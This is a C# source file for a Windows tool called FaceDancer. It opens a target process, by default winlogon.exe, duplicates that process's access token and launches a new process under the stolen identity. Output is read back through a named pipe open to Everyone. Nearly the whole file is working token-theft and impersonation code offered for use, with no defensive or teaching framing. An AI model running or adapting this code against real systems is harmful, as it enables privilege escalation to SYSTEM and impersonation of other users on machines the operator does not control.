using Microsoft.Win32.SafeHandles;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;

namespace FaceDancer
{
    class FaceDancer
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool OpenProcessToken(IntPtr ProcessHandle,
            uint desiredAccess, out IntPtr TokenHandle);


        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal extern static bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            IntPtr lpTokenAttributes,
            uint ImpersonationLevel,
            TOKEN_TYPE TokenType,
            out IntPtr phNewToken);

        internal enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        internal static extern bool CreateProcessWithTokenW(IntPtr hToken, IntPtr dwLogonFlags, 
            string lpApplicationName, string lpCommandLine, IntPtr dwCreationFlags, 
            IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, 
            out PROCESS_INFORMATION lpProcessInformation);

        internal enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        internal struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public STARTF dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [Flags]
        internal enum STARTF : uint
        {
            STARTF_USESHOWWINDOW = 0x00000001,
            STARTF_USESIZE = 0x00000002,
            STARTF_USEPOSITION = 0x00000004,
            STARTF_USECOUNTCHARS = 0x00000008,
            STARTF_USEFILLATTRIBUTE = 0x00000010,
            STARTF_RUNFULLSCREEN = 0x00000020,  // ignored for non-x86 platforms
            STARTF_FORCEONFEEDBACK = 0x00000040,
            STARTF_FORCEOFFFEEDBACK = 0x00000080,
            STARTF_USESTDHANDLES = 0x00000100,
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        static void Main(string[] args)
        {
            int procId;
            string file;

            if (args.Length < 2)
            {
                file = "C:\\Windows\\System32\\nslookup.exe";
                if (args.Length == 0)
                {
                    // If we don't have a process ID as an argument, find winlogon.exe
                    procId = Process.GetProcessesByName("winlogon").First().Id;
                }
                else if (args[0].Contains('.'))
                {
                    procId = Process.GetProcessesByName("winlogon").First().Id;
                    if (args != null)
                    {
                        file = args[0];
                    }
                }
                else
                {
                    procId = Convert.ToInt32(args[0]);
                }
            }
            else
            {
                procId = Convert.ToInt32(args[0]);
                file = args[1];
            }
            Console.WriteLine("Stealing token from PID " + procId);

            IntPtr tokenHandle = IntPtr.Zero;
            IntPtr dupHandle = IntPtr.Zero;

            SafeWaitHandle procHandle = new SafeWaitHandle(Process.GetProcessById(procId).Handle, true);
            Console.WriteLine("Process handle: True");

            bool procToken = OpenProcessToken(procHandle.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, out tokenHandle);
            Console.WriteLine("OpenProcessToken: " + procToken);

            bool duplicateToken = DuplicateTokenEx(tokenHandle, (uint)TokenAccessLevels.MaximumAllowed, IntPtr.Zero, 
                (uint)TokenImpersonationLevel.Impersonation, TOKEN_TYPE.TokenImpersonation, out dupHandle);
            Console.WriteLine("DuplicateTokenEx: " + duplicateToken);
            WindowsIdentity ident = new WindowsIdentity(dupHandle);
            Console.WriteLine("Impersonated user: " + ident.Name);

            STARTUPINFO startInfo = new STARTUPINFO();

            // INITIALIZE NAMED PIPE CLIENT / SERVER FOR GETTING OUTPUT
            string pipeName = "FaceDancerPipe";

            PipeSecurity sec = new PipeSecurity();
            sec.SetAccessRule(new PipeAccessRule("NT AUTHORITY\\Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));

            NamedPipeServerStream pipeServer = new NamedPipeServerStream(pipeName, PipeDirection.In, 
                NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message, PipeOptions.None, 1024, 1024, sec);

            NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", pipeName, PipeDirection.Out, PipeOptions.None);
            pipeClient.Connect();
            pipeServer.WaitForConnection();
            SafePipeHandle clientHandle = pipeClient.SafePipeHandle;

            // Set process to use named pipe for input/output
            startInfo.hStdOutput = clientHandle.DangerousGetHandle();
            startInfo.dwFlags = STARTF.STARTF_USESTDHANDLES;
            // END NAME PIPE INITIALIZATION

            PROCESS_INFORMATION newProc = new PROCESS_INFORMATION();
            using (StreamReader reader = new StreamReader(pipeServer))
            {
                bool createProcess = CreateProcessWithTokenW(dupHandle, IntPtr.Zero, null, "\"nslookup.exe\" \"www.google.com\"", IntPtr.Zero, IntPtr.Zero, "C:\\Temp", ref startInfo, out newProc);
                Process proc = Process.GetProcessById(newProc.dwProcessId);
                while (!proc.HasExited)
                {
                    Thread.Sleep(1000);
                }
                pipeClient.Close();
                string output = reader.ReadToEnd();
                Console.WriteLine("Started process with ID " + newProc.dwProcessId);
                Console.WriteLine("CreateProcess return code: " + createProcess);
                Console.WriteLine("Process output: " + output);
            }

            pipeServer.Close();
            
            CloseHandle(tokenHandle);
            CloseHandle(dupHandle);
        }
    }
}
